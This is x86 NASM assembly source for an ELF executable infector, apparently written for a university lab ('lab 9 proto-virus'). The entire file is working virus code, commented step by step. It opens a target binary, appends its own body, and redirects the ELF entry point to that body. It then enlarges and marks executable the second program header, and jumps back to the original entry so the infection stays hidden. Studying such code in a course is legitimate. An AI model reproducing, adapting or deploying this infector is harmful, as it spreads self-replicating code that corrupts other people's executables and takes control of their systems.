%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define ELF_MAGIC 0x464C457F
%define PHDR_flags 24

    global _start
    
section .text
    
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	;CODE START
    
    ; OPEN THE FILE
	call get_my_loc ;;here we get the location of the next_i
	sub ecx ,next_i - FileName
  	mov eax,ecx
	open eax,RDWR,0644
	cmp eax,-1
	jl codeExit
    
    ; SAVE THE FD IN THE FIRST LOCAL VARIBALE
    mov dword [ebp - 4], eax
    
    ; MAKE ESI HOLD THE ADDRESS OF THE BUFFER FOR THE MAGIC BYTES (ONLY FIRST FOUR)
    mov edi, [ebp-4]
    lea esi, [ebp-8]
    ; READ THE FILE
    read edi, esi, 4
    ; COMPARE THE FIRST MAGIC BITS TO: 7F 'E' 'L' 'F' 
    cmp dword [esi], ELF_MAGIC
	jne error_elf
	
    ; IF IT IS AN ELF FILE PRINT OUTSTR
    elf_file:
		call get_my_loc
    	mov ecx, OutStr
    	write stdout, ecx, 31
        ; GO TO END OF FILE
        lseek edi, 0, 2
        ; SAVE THE SIZE OF THE FILE IN THE SECOND LOCAL VAR
        mov dword [ebp - 200], eax
        
        ; SAVE THE START ADDRESS OF CODE TO ADD
        call get_my_loc
        sub ecx, next_i-_start
        mov dword [ebp - 12], ecx
        
        ; SAVE THE SIZE OF THE CODE TO ADD
        call get_my_loc
        sub ecx, next_i
        add ecx, virus_end - _start
        mov dword [ebp - 16], ecx
        
        ; WRITE TO FILE THE VIRUS
        mov edi, dword [ebp - 4];;the addres
        mov ecx, dword [ebp - 12];;the start of the code
        mov edx, dword [ebp - 16];;length of the byts
        write edi, ecx, edx
        
        ; RESETING THE FILE POINTER
        mov edi, [ebp-4]
        lseek edi, 0, SEEK_SET
        ; pointer to the header file
        lea esi, [ebp - STK_RES]
        ; reading the elf file-elf eader
        read edi, esi, ELFHDR_size
        
        ; GO TO LOCATION OF LABEL PreviousEntryPoint IN THE FILE
        lseek edi, -4, SEEK_END
        lea ebx, [ebp - STK_RES + ENTRY]
        write edi, ebx, 4

        ; MODIFY THE ELF FILE
        
        ; READING THE SECOND PROGRAM HEADER: LOCATION IS AFTER THE ELF HEADER + THE SIZE OF THE FIRST PROGRAM HEADER
        mov edi, [ebp-4]
        mov ebx, ELFHDR_size
        add ebx, PHDR_size
        lseek edi, ebx, SEEK_SET                   ; MOVE FILE POINTER TO SECOND PROGRAM HEADER
        lea ebx, [ebp - STK_RES + ELFHDR_size] ; EBX IS NOW THE BUFFER FOR THE SECOND HEADER
        read edi, ebx, PHDR_size                   ; READING THE SECOND PROGRAM HEADER

        ; WE NEED TO CALCULATE THE NEW ENTRY POINT (WHICH IS THE START OF THE VIRUS) AND UPDATE THE FILES ENTRY
        ; NEW ENTRY POINT = PREV SIZE OF FILE + SECOND PROGRAM HEADER'S VADDR - SECOND PROGRAM HEADER'S OFFSET
        mov esi, [ebp - 200]
        add esi, [ebp-STK_RES+ELFHDR_size+PHDR_vaddr]
        sub esi, [ebp-STK_RES+ELFHDR_size+PHDR_offset]
        mov [ebp-STK_RES+ENTRY], esi
        
        ; UPDATING THE MEMSIZE AND FILESIZE OF THE SECOND PROGRAM HEADER
        ; FILE SIZE = MEM SIZE = OLD FILE SIZE + VIRUS CODE - PROGRAM HEADER OFFSET
        mov esi, [ebp -200]
        add esi, [ebp - 16]
        sub esi, [ebp-STK_RES+ELFHDR_size+PHDR_offset]
        mov [ebp-STK_RES+ELFHDR_size+PHDR_filesize], esi
        mov [ebp-STK_RES+ELFHDR_size+PHDR_memsize], esi
        
        or dword [ebp - STK_RES + ELFHDR_size + PHDR_flags], 0x1		; add execute permission to the flag

        ; UPDATING THE FILE'S PROGRAM HEADER
        mov edi, [ebp-4]
        mov ebx, ELFHDR_size
        add ebx, PHDR_size
        lseek edi, ebx, SEEK_SET                   ; MOVE FILE POINTER TO SECOND PROGRAM HEADER
        lea ebx, [ebp - STK_RES + ELFHDR_size]     ; EBX POINTS TO THE UPDATED SECOND HEADER
        write edi, ebx, PHDR_size                  ; WRITING THE SECOND PROGRAM HEADER TO FILE
        
        ; UPDATING THE FILE'S ELF HEADER
        mov edi, [ebp-4]
        lseek edi, 0, SEEK_SET                     ; MOVE FILE POINTER TO ELF HEADER
        lea ebx, [ebp - STK_RES]                   ; EBX POINTS TO THE UPDATED ELF HEADER
        write edi, ebx, ELFHDR_size                  ; WRITING THE SECOND PROGRAM HEADER TO FILE
        
        ; CLOSING FILE
        mov edi, [ebp-4]
        close edi
        
        ; AFTER FINISHING THE VIRUS CODE WE JUMP TO THE PREVIOUS ENTRY POINT
        ; SO THAT THE PROGRAM CONTINUES RUNNING THE ORIGINAL PROGRAM
        jmp codeExit
        
    error_elf:
        call get_my_loc
        add ecx, (Failstr - next_i)
        write stdout, ecx, 13
        jmp codeExit
        
    codeExit:
        call get_my_loc
        add ecx, (PreviousEntryPoint - next_i)
        mov eax, [ecx]
        add esp, STK_RES
        pop ebp
        jmp eax
        
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
                         
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
	
FileName: db "ELFexec", 0
OutStr: db "The lab 9 proto-virus strikes!", 10, 0
Failstr: db "perhaps not", 10 , 0

PreviousEntryPoint: dd VirusExit
virus_end:

